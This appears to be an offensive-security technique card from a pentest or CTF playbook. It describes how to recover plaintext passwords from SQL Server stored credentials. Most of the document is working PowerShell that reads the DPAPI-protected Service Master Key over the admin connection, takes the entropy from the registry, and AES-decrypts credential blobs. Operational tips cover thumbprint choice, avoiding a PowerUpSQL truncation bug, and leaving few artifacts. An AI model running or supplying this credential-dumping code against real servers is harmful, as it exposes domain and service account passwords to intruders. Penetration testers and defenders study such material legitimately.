# MSSQL Credential Password Decryption

## When to use

- MSSQL sysadmin access (direct or via impersonation)
- Target has saved credentials in `sys.credentials` (check: `SELECT name, credential_identity FROM sys.credentials`)
- Goal: recover the plaintext password stored in a SQL Server credential
- Common in CTF/pentest: SQL Agent proxies with domain or local account passwords

## Tags

- ATT&CK: T1555 (Credentials from Password Stores), T1003.004 (OS Credential Dumping: LSA Secrets)
- Platform: Windows
- Services: MSSQL 2012+
- Privileges: sysadmin role, local admin (for registry read)

## How it works

SQL Server encrypts credential passwords with the Service Master Key (SMK). The SMK
is itself encrypted with DPAPI and stored in `sys.key_encryptions`. Decrypting the
credential requires: (1) reading the DPAPI-encrypted SMK via DAC, (2) reading the
DPAPI entropy from the registry, (3) calling `ProtectedData.Unprotect` with the
entropy and `LocalMachine` scope, (4) using the decrypted SMK to AES-decrypt the
credential blob.

## Prerequisites

- Dedicated Admin Connection (DAC) access: `Server=admin:localhost` in connection string
- Registry read access to `HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\<instance>\Security`
- PowerShell with `System.Security` assembly (built-in on Windows)

## Reading the encrypted blobs

Connect via DAC to read internal system tables:

```powershell
$dac = New-Object System.Data.SqlClient.SqlConnection("Server=admin:localhost;Database=master;Integrated Security=true")
$dac.Open()

# SMK blob - use MACHINE KEY thumbprint (0x03...), NOT user key (0x01)
$q = $dac.CreateCommand()
$q.CommandText = "SELECT crypt_property FROM sys.key_encryptions WHERE key_id = 102 AND thumbprint = 0x0300000001"
$r = $q.ExecuteReader()
$r.Read()
$smkBlob = [byte[]]$r[0]
$r.Close()

# Credential blob - use DATALENGTH, not LEN (LEN truncates at null bytes)
$q2 = $dac.CreateCommand()
$q2.CommandText = "SELECT imageval FROM sys.sysobjvalues WHERE objid = <credential_id> AND valclass = 28 AND valnum = 2"
$r2 = $q2.ExecuteReader()
$r2.Read()
$credBlob = [byte[]]$r2[0]
$r2.Close()
$dac.Close()
```

Find the credential ID: `SELECT credential_id FROM sys.credentials WHERE name = '<name>'`

## Reading the DPAPI entropy

```powershell
$instPath = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL").MSSQLSERVER
$entropy = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instPath\Security").Entropy
```

For named instances, replace `MSSQLSERVER` with the instance name.

## Decrypting the SMK

```powershell
Add-Type -AssemblyName System.Security

# Strip 8-byte SQL header from the DPAPI blob
$dpapiBlob = New-Object byte[] ($smkBlob.Length - 8)
[Array]::Copy($smkBlob, 8, $dpapiBlob, 0, $dpapiBlob.Length)

# Decrypt with entropy and LocalMachine scope
$smk = [Security.Cryptography.ProtectedData]::Unprotect(
    $dpapiBlob, $entropy,
    [Security.Cryptography.DataProtectionScope]::LocalMachine
)
# Result: 32 bytes (AES-256 key) for MSSQL 2012+
```

## Decrypting the credential password

```powershell
# Credential blob structure: 4-byte version + 16-byte IV + AES ciphertext
$credIV = $credBlob[4..19]
$credCT = $credBlob[20..($credBlob.Length - 1)]

$aes = [Security.Cryptography.Aes]::Create()
$aes.Mode = [Security.Cryptography.CipherMode]::CBC
$aes.Padding = [Security.Cryptography.PaddingMode]::None
$aes.KeySize = 256
$aes.Key = $smk
$aes.IV = $credIV
$dec = $aes.CreateDecryptor()
$pt = $dec.TransformFinalBlock($credCT, 0, $credCT.Length)

# Skip 8-byte internal header (0x0DF0ADBA + length), decode UTF-16LE, trim nulls
$password = [Text.Encoding]::Unicode.GetString($pt, 8, $pt.Length - 8).TrimEnd([char]0)
```

## Operational notes

**Thumbprint matters.** `sys.key_encryptions` stores the SMK encrypted under multiple
keys. Thumbprint `0x01` is the user-key DPAPI encryption (requires the service
account's interactive profile and current password). Thumbprint `0x0300000001` is the
machine-key encryption (works with registry entropy + LocalMachine scope). Always use
the machine key.

**LEN vs DATALENGTH bug.** PowerUpSQL's `Get-MSSQLCredentialPasswords` uses `LEN()`
to measure the ciphertext, which stops at embedded null bytes (`0x00`) in the
UTF-16LE data and truncates the password. Use `DATALENGTH()` instead.

**DPAPI context.** The `ProtectedData.Unprotect` call must run on the SQL Server host.
Running from `xp_cmdshell` may fail ("data is invalid") because the spawned `cmd.exe`
doesn't load the machine DPAPI keys. Run from a SQL Agent CmdExec step or a standalone
PowerShell script executed on the host.

**MSSQL 2008 and earlier.** Older versions use 3DES instead of AES. The SMK will be
16 bytes and the IV will be 8 bytes. Adjust accordingly.

## Cleanup

This technique is read-only. No artifacts are created on the target beyond the
PowerShell process and DAC connection (both ephemeral).

## Proven on

- SQL Server 2025 on Windows 11 Pro (HTB, 2026-11-11): AES-256, 32-byte SMK, 256-byte entropy
